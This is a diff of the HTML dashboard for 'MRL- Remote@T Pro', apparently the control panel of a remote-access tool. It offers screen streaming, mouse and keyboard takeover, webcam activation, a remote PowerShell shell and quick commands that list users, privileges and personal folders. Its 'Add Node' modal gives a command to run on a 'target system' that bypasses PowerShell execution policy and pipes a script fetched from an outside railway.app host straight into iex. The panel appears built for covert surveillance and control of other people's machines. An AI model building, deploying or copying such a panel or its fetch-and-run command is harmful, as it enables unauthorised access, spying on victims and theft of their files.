@@ -4,47 +4,75 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MRL- Remote@T | Pro Edition</title>
+    <meta name="description" content="MRL Remote@T Pro - Advanced Remote Node Management System">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="/style.css">
 </head>
 <body>
     <div class="cyber-grid"></div>
     <div class="pro-container">
+        <!-- Sidebar -->
         <div class="sidebar">
             <div class="pro-header">
-                <i class="fas fa-satellite-dish" style="color:var(--accent-primary)"></i>
-                <span>MRL- <span style="color:white">Remote@T</span></span>
+                <div class="logo-icon"><i class="fas fa-satellite-dish"></i></div>
+                <div class="logo-text">MRL- <span>Remote@T</span></div>
             </div>
             <nav class="pro-nav">
-                <div class="nav-item active" data-view="dashboard" onclick="navigateTo('dashboard')"><i class="fas fa-th-large"></i> Dashboard</div>
+                <div class="nav-section-label">NAVIGATION</div>
+                <div class="nav-item active" data-view="dashboard" onclick="navigateTo('dashboard')">
+                    <i class="fas fa-th-large"></i><span>Dashboard</span>
+                </div>
+                <div class="nav-section-label" id="nodes-label" style="display:none">ACTIVE NODES</div>
                 <div id="dynamic-remote-links"></div>
-                <div class="nav-item" data-view="recordings" onclick="navigateTo('recordings')"><i class="fas fa-folder-open"></i> Archive</div>
-                <div class="nav-item" data-view="tools" id="nav-tools" onclick="navigateTo('tools')"><i class="fas fa-list"></i> Task Manager</div>
+                <div class="nav-section-label">TOOLS</div>
+                <div class="nav-item" data-view="recordings" onclick="navigateTo('recordings')">
+                    <i class="fas fa-folder-open"></i><span>Archive</span>
+                </div>
+                <div class="nav-item" data-view="tools" id="nav-tools" onclick="navigateTo('tools')">
+                    <i class="fas fa-list"></i><span>Task Manager</span>
+                </div>
             </nav>
-            <div style="margin-top:auto">
-                <button class="btn" id="btn-disconnect" style="width:100%" onclick="window.location.reload()"><i class="fas fa-power-off"></i> Refresh Dash</button>
+            <div class="sidebar-footer">
+                <button class="btn sidebar-btn" onclick="fetchDevices()">
+                    <i class="fas fa-sync-alt"></i> Refresh
+                </button>
             </div>
         </div>
 
+        <!-- Main Area -->
         <div class="main-area">
             <header class="main-header">
                 <div class="status">
-                    <div id="header-status-dot" class="dot gray"></div>
+                    <div id="header-status-dot" class="dot gray pulse"></div>
                     <span id="header-status-text">MRL- OFFLINE</span>
                 </div>
-                <div id="active-host-name" class="pro-label" style="margin-left:auto; color:white;">ROOT CONSOLE</div>
+                <div id="active-host-name" class="host-badge">ROOT CONSOLE</div>
+                <div class="header-right">
+                    <div class="header-stat"><i class="fas fa-clock"></i> <span id="clock">--:--:--</span></div>
+                </div>
             </header>
 
             <div class="view-session-wrapper">
                 <div class="page-container">
                     <!-- Dashboard -->
                     <div id="view-dashboard" class="page-view active">
-                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
-                            <h1>Systems Grid</h1>
-                            <button class="btn" onclick="toggleModal('modal-add-user', true)"><i class="fas fa-plus"></i> Add Node</button>
+                        <div class="page-header">
+                            <div>
+                                <h1>Systems Grid</h1>
+                                <p class="page-sub">Connected remote nodes</p>
+                            </div>
+                            <button class="btn btn-primary" onclick="toggleModal('modal-add-user', true)">
+                                <i class="fas fa-plus"></i> Add Node
+                            </button>
                         </div>
                         <div class="device-grid" id="device-grid">
-                            <!-- Devices Load Here -->
+                            <div class="empty-state">
+                                <i class="fas fa-satellite-dish"></i>
+                                <p>No nodes connected</p>
+                                <span>Run the PowerShell command on a target system</span>
+                            </div>
                         </div>
                     </div>
 
@@ -52,14 +80,19 @@
                     <div id="view-remote" class="page-view">
                         <div class="screens-grid">
                             <video id="remote-video" autoplay playsinline muted></video>
-                            <canvas id="ws-video" class="hidden" style="width: 100%; height: 100%; object-fit: contain;"></canvas>
-                            <video id="webcam-video" autoplay playsinline muted class="hidden"></video>
+                            <canvas id="ws-video" class="hidden" style="width:100%;height:100%;object-fit:contain;background:#000;"></canvas>
                         </div>
                     </div>
 
                     <!-- Tools View -->
                     <div id="view-tools" class="page-view">
-                        <h1>Process Manager</h1>
+                        <div class="page-header">
+                            <div>
+                                <h1>Process Manager</h1>
+                                <p class="page-sub" id="proc-host-label">Select a node first</p>
+                            </div>
+                            <button class="btn" onclick="requestProcessList()"><i class="fas fa-sync-alt"></i> Refresh</button>
+                        </div>
                         <div class="table-scroll">
                             <table class="pro-table">
                                 <thead><tr><th>Name</th><th>PID</th><th>CPU</th><th>RAM</th><th>Action</th></tr></thead>
@@ -70,11 +103,15 @@
 
                     <!-- Archive View -->
                     <div id="view-recordings" class="page-view">
-                        <h1>Operation Archive</h1>
+                        <div class="page-header">
+                            <h1>Operation Archive</h1>
+                        </div>
                         <div class="table-scroll">
                             <table class="pro-table">
                                 <thead><tr><th>Name</th><th>Size</th><th>Date</th></tr></thead>
-                                <tbody id="recordings-body"></tbody>
+                                <tbody id="recordings-body">
+                                    <tr><td colspan="3" style="text-align:center;color:var(--text-muted);padding:30px;">No archived sessions</td></tr>
+                                </tbody>
                             </table>
                         </div>
                     </div>
@@ -83,126 +120,178 @@
                 <!-- Right Control Sidebar -->
                 <div class="right-sidebar hidden" id="right-control-panel">
                     <div class="panel-section">
-                        <div class="pro-label">Session Controls</div>
-                        <div class="control-item">
+                        <div class="pro-label"><i class="fas fa-gamepad"></i> Session Controls</div>
+                        <div class="toggle-row">
                             <span>Mouse Input</span>
-                            <input type="checkbox" id="mouse-control">
+                            <label class="toggle-switch"><input type="checkbox" id="mouse-control" checked><span class="toggle-slider"></span></label>
                         </div>
-                        <div class="control-item">
-                            <span>Keyboard Input</span>
-                            <input type="checkbox" id="keyboard-control">
+                        <div class="toggle-row">
+                            <span>Keyboard</span>
+                            <label class="toggle-switch"><input type="checkbox" id="keyboard-control" checked><span class="toggle-slider"></span></label>
                         </div>
-                        <div class="control-item">
+                        <div class="toggle-row">
                             <span>Webcam Link</span>
-                            <input type="checkbox" id="webcam-control">
+                            <label class="toggle-switch"><input type="checkbox" id="webcam-control"><span class="toggle-slider"></span></label>
                         </div>
-                        <div class="control-item" style="margin-top:10px;">
-                            <span>Hardware</span>
-                            <select id="webcam-select" onchange="switchWebcam(this.value)" class="pro-select" style="width:120px; font-size:11px; padding:2px;">
-                                <option value="0">Cam 0 (Default)</option>
-                                <option value="1">Cam 1</option>
-                                <option value="2">Cam 2</option>
-                                <option value="3">Cam 3</option>
+                        <div class="toggle-row">
+                            <span>Camera</span>
+                            <select id="webcam-select" onchange="switchWebcam(this.value)" class="pro-select-sm">
+                                <option value="0">Cam 0</option><option value="1">Cam 1</option>
+                                <option value="2">Cam 2</option><option value="3">Cam 3</option>
                             </select>
                         </div>
                     </div>
 
                     <div class="panel-section">
-                        <div class="pro-label">Monitor Selection</div>
-                        <select id="display-select" class="pro-select">
-                            <option value="0">Default Display</option>
-                        </select>
-                        <div style="font-size:11px; color:var(--text-muted); margin-top:8px;">
-                            Detecting all connected screens...
+                        <div class="pro-label"><i class="fas fa-desktop"></i> Monitor Selection</div>
+                        <select id="display-select" class="pro-select"></select>
+                    </div>
+
+                    <div class="panel-section">
+                        <div class="pro-label"><i class="fas fa-chart-line"></i> Telemetry</div>
+                        <div class="stats-box">
+                            <div class="stat-row"><span>Latency</span><span id="stat-latency" class="stat-val">-- ms</span></div>
+                            <div class="stat-row"><span>Bitrate</span><span id="stat-bitrate" class="stat-val">-- kbps</span></div>
+                            <div class="stat-row"><span>FPS</span><span id="stat-fps" class="stat-val">--</span></div>
+                            <div class="stat-row"><span>Signal</span><span id="stat-signal" class="stat-val stat-green">WS RELAY</span></div>
                         </div>
                     </div>
 
                     <div class="panel-section">
-                        <div class="pro-label">P2P Telemetry</div>
-                        <div id="session-stats" class="stats-box">
-                            <div>Latency: <span id="stat-latency">-- ms</span></div>
-                            <div>Bitrate: <span id="stat-bitrate">-- kbps</span></div>
-                            <div>FPS: <span id="stat-fps">--</span></div>
-                        </div>
-                    </div>
-                    
-                    <button class="btn btn-danger" onclick="disconnectSession()">
-                        <i class="fas fa-times"></i> Terminate Session
-                    </button>
-                    <button class="btn" style="margin-top: 10px; background: var(--bg-card);" onclick="forceWebSocketRelay()">
-                        <i class="fas fa-network-wired"></i> Force WS Relay
-                    </button>
-
-                    <div class="control-section" style="margin-top: 20px;">
-                        <h3 class="section-title">Stream Optimization</h3>
-                        <div class="control-group">
-                            <label>Max FPS: <span id="val-fps">20</span></label>
+                        <div class="pro-label"><i class="fas fa-sliders-h"></i> Stream Quality</div>
+                        <div class="slider-row">
+                            <label>FPS <span id="val-fps" class="val-badge">20</span></label>
                             <input type="range" id="slider-fps" min="5" max="60" value="20" class="slider">
                         </div>
-                        <div class="control-group">
-                            <label>Quality: <span id="val-quality">medium</span></label>
-                            <input type="range" id="slider-quality" min="10" max="100" value="50" class="slider">
+                        <div class="slider-row">
+                            <label>Quality <span id="val-quality" class="val-badge">med</span></label>
+                            <input type="range" id="slider-quality" min="10" max="95" value="50" class="slider">
                         </div>
-                        <div class="control-group">
-                            <label class="switch-label">
-                                <span>High Fidelity Audio</span>
-                                <input type="checkbox" id="audio-toggle">
-                            </label>
+                        <div class="toggle-row" style="margin-top:8px;">
+                            <span>Audio</span>
+                            <label class="toggle-switch"><input type="checkbox" id="audio-toggle"><span class="toggle-slider"></span></label>
                         </div>
                     </div>
 
-                    <div class="control-section" style="margin-top: 20px;" id="terminal-section">
-                        <h3 class="section-title"><i class="fas fa-terminal" style="margin-right:8px; color:var(--pro-blue);"></i> Remote PowerShell</h3>
-                        <div id="ps-output" class="terminal">
-                            <div class="term-line">System ready. Type a command...</div>
-                        </div>
+                    <div class="panel-section">
+                        <div class="pro-label"><i class="fas fa-terminal"></i> Remote Shell</div>
+                        <div id="ps-output" class="terminal"></div>
                         <div class="term-input-wrap">
-                            <span style="color:var(--pro-blue);">></span>
-                            <input type="text" id="ps-input" class="term-input" placeholder="Enter command..." onkeydown="if(event.key==='Enter') { runRemotePs(this.value); event.preventDefault(); }">
-                            <button class="btn-icon" onclick="runRemotePs(document.getElementById('ps-input').value)" style="background:none; border:none; color:var(--pro-blue); cursor:pointer;"><i class="fas fa-paper-plane"></i></button>
+                            <span class="term-prompt">PS&gt;</span>
+                            <input type="text" id="ps-input" class="term-input" placeholder="command..." onkeydown="if(event.key==='Enter'){runRemotePs(this.value);event.preventDefault();}">
+                            <button class="btn-icon-send" onclick="runRemotePs(document.getElementById('ps-input').value)"><i class="fas fa-paper-plane"></i></button>
                         </div>
                     </div>
 
-                    <div class="control-section" style="margin-top: 20px;">
-                        <h3 class="section-title">System Specs</h3>
-                        <div id="detailed-specs" class="specs-list">
-                            <div class="spec-item">USER: <span id="spec-user">--</span></div>
-                            <div class="spec-item">OS: <span id="spec-os">--</span></div>
-                            <div class="spec-item">CPU: <span id="spec-cpu">--</span></div>
-                            <div class="spec-item">RAM: <span id="spec-ram">--</span></div>
-                            <div class="spec-item">DISK: <span id="spec-disk">--</span></div>
-                            <div class="spec-item">GPU: <span id="spec-gpu">--</span></div>
+                    <div class="panel-section">
+                        <div class="pro-label"><i class="fas fa-microchip"></i> System Specs</div>
+                        <div class="specs-list">
+                            <div class="spec-item"><span class="spec-key">USER</span><span id="spec-user">--</span></div>
+                            <div class="spec-item"><span class="spec-key">OS</span><span id="spec-os">--</span></div>
+                            <div class="spec-item"><span class="spec-key">CPU</span><span id="spec-cpu">--</span></div>
+                            <div class="spec-item"><span class="spec-key">RAM</span><span id="spec-ram">--</span></div>
+                            <div class="spec-item"><span class="spec-key">DISK</span><span id="spec-disk">--</span></div>
+                            <div class="spec-item"><span class="spec-key">GPU</span><span id="spec-gpu">--</span></div>
                         </div>
+                    </div>
+
+                    <div class="panel-section panel-actions">
+                        <button class="btn btn-danger btn-full" onclick="disconnectSession()">
+                            <i class="fas fa-times"></i> End Session
+                        </button>
+                        <button class="btn btn-full" style="margin-top:8px;" onclick="forceWebSocketRelay()">
+                            <i class="fas fa-sync-alt"></i> Reconnect Stream
+                        </button>
                     </div>
                 </div>
             </div>
 
+            <!-- Footer -->
             <footer class="main-footer">
-                <div>MRL- Remote@T | v9.3.12-UCON</div>
-                <div id="footer-stats">SIGNAL: STANDBY</div>
+                <div class="footer-left">MRL- Remote@T | v9.3.12-UCON</div>
+                <div class="footer-center">
+                    <!-- Commands Button -->
+                    <button class="cmd-fab" id="cmd-fab-btn" onclick="toggleCommandPanel()">
+                        <i class="fas fa-terminal"></i>
+                        <span>Commands</span>
+                        <i class="fas fa-chevron-up" id="cmd-chevron"></i>
+                    </button>
+                </div>
+                <div id="footer-stats" class="footer-right">SIGNAL: STANDBY</div>
             </footer>
+        </div>
+    </div>
+
+    <!-- Commands Panel (slides up from bottom) -->
+    <div id="commands-panel" class="commands-panel hidden">
+        <div class="commands-header">
+            <span><i class="fas fa-terminal"></i> Quick Commands</span>
+            <button class="btn-icon-close" onclick="toggleCommandPanel()"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="commands-grid">
+            <div class="cmd-section">
+                <div class="cmd-section-title"><i class="fas fa-info-circle"></i> System Info</div>
+                <button class="cmd-btn" onclick="quickCmd('systeminfo')"><i class="fas fa-server"></i> System Info</button>
+                <button class="cmd-btn" onclick="quickCmd('Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 | Format-Table Name,Id,CPU,WorkingSet -AutoSize')"><i class="fas fa-list"></i> Top 10 Processes</button>
+                <button class="cmd-btn" onclick="quickCmd('ipconfig /all')"><i class="fas fa-network-wired"></i> IP Config</button>
+                <button class="cmd-btn" onclick="quickCmd('Get-Disk | Format-Table')"><i class="fas fa-hdd"></i> Disk Info</button>
+                <button class="cmd-btn" onclick="quickCmd('Get-WmiObject Win32_VideoController | Select Name,AdapterRAM | Format-List')"><i class="fas fa-microchip"></i> GPU Info</button>
+            </div>
+            <div class="cmd-section">
+                <div class="cmd-section-title"><i class="fas fa-shield-alt"></i> Security</div>
+                <button class="cmd-btn" onclick="quickCmd('Get-NetFirewallProfile | Format-Table Name,Enabled')"><i class="fas fa-fire"></i> Firewall Status</button>
+                <button class="cmd-btn" onclick="quickCmd('Get-LocalUser | Format-Table Name,Enabled,LastLogon')"><i class="fas fa-users"></i> Local Users</button>
+                <button class="cmd-btn" onclick="quickCmd('Get-NetTCPConnection -State Listen | Select LocalPort,State | Sort LocalPort | Format-Table')"><i class="fas fa-plug"></i> Open Ports</button>
+                <button class="cmd-btn" onclick="quickCmd('whoami /all')"><i class="fas fa-id-card"></i> Current Privileges</button>
+            </div>
+            <div class="cmd-section">
+                <div class="cmd-section-title"><i class="fas fa-tools"></i> Utilities</div>
+                <button class="cmd-btn" onclick="quickCmd('Get-EventLog -LogName Application -Newest 20 | Format-Table TimeGenerated,EntryType,Message -AutoSize -Wrap')"><i class="fas fa-journal-whills"></i> App Event Log</button>
+                <button class="cmd-btn" onclick="quickCmd('Get-Service | Where-Object {$_.Status -eq \'Running\'} | Format-Table Name,Status')"><i class="fas fa-cogs"></i> Running Services</button>
+                <button class="cmd-btn" onclick="quickCmd('Get-StartupCommand | Format-Table Name,Command')"><i class="fas fa-play-circle"></i> Startup Items</button>
+                <button class="cmd-btn" onclick="quickCmd('[Environment]::OSVersion; $env:COMPUTERNAME; $env:USERNAME; (Get-Date)')"><i class="fas fa-info"></i> Quick Summary</button>
+            </div>
+            <div class="cmd-section">
+                <div class="cmd-section-title"><i class="fas fa-folder"></i> Files</div>
+                <button class="cmd-btn" onclick="quickCmd('Get-ChildItem $env:USERPROFILE\\Desktop | Format-Table Name,Length,LastWriteTime')"><i class="fas fa-desktop"></i> Desktop Files</button>
+                <button class="cmd-btn" onclick="quickCmd('Get-ChildItem $env:USERPROFILE\\Documents | Format-Table Name,Length,LastWriteTime')"><i class="fas fa-file"></i> Documents</button>
+                <button class="cmd-btn" onclick="quickCmd('Get-ChildItem $env:USERPROFILE\\Downloads | Sort-Object LastWriteTime -Descending | Select-Object -First 20 | Format-Table')"><i class="fas fa-download"></i> Recent Downloads</button>
+                <button class="cmd-btn" onclick="quickCmd('Get-ChildItem $env:TEMP | Sort-Object LastWriteTime -Descending | Select-Object -First 10 | Format-Table')"><i class="fas fa-trash"></i> Temp Files</button>
+            </div>
+        </div>
+        <div class="commands-custom-input">
+            <span class="term-prompt">PS&gt;</span>
+            <input type="text" id="cmd-panel-input" class="term-input" placeholder="Custom command..." onkeydown="if(event.key==='Enter'){runCommandFromPanel();event.preventDefault();}">
+            <button class="btn btn-primary" onclick="runCommandFromPanel()"><i class="fas fa-play"></i> Run</button>
         </div>
     </div>
 
     <!-- Draggable Webcam Overlay -->
     <div id="webcam-overlay" class="draggable-webcam hidden">
-        <video id="webcam-video" autoplay playsinline muted></video>
+        <img id="webcam-feed" src="" alt="webcam">
         <div class="drag-handle"><i class="fas fa-grip-lines"></i></div>
     </div>
 
-    <!-- Modals -->
-    <div id="modal-add-user" class="hidden modal-overlay">
+    <!-- Add Node Modal -->
+    <div id="modal-add-user" class="hidden modal-overlay" onclick="if(event.target===this)toggleModal('modal-add-user',false)">
         <div class="modal-card">
-            <h2>Add New Remote Node</h2>
-            <p style="font-size:13px; color:var(--text-muted);">Execute this command on the target system (Admin PowerShell):</p>
-            <code id="install-cmd">powershell -ExecutionPolicy Bypass -Command "iwr -useb 'https://web-production-d6db5.up.railway.app/api/script' | iex"</code>
-            <div style="display:flex; gap:15px; margin-top:20px;">
-                <button class="btn" onclick="navigator.clipboard.writeText(document.getElementById('install-cmd').innerText); this.innerHTML='<i class=\'fas fa-check\'></i> Copied!'; setTimeout(()=>this.innerHTML='<i class=\'fas fa-copy\'></i> Copy Command', 2000)"><i class="fas fa-copy"></i> Copy Command</button>
-                <button class="btn btn-danger" onclick="toggleModal('modal-add-user', false)">Close</button>
+            <div class="modal-header">
+                <h2><i class="fas fa-plus-circle"></i> Add New Remote Node</h2>
+            </div>
+            <p class="modal-sub">Run this command on the target system in an <strong>Admin PowerShell</strong> window:</p>
+            <div class="cmd-box">
+                <code id="install-cmd">powershell -ExecutionPolicy Bypass -Command "iwr -useb 'https://web-production-d6db5.up.railway.app/api/script' | iex"</code>
+            </div>
+            <div class="modal-actions">
+                <button class="btn btn-primary" onclick="copyInstallCmd(this)">
+                    <i class="fas fa-copy"></i> Copy Command
+                </button>
+                <button class="btn btn-danger" onclick="toggleModal('modal-add-user', false)">
+                    <i class="fas fa-times"></i> Close
+                </button>
             </div>
         </div>
     </div>
-
 
     <script src="/script.js"></script>
 </body>
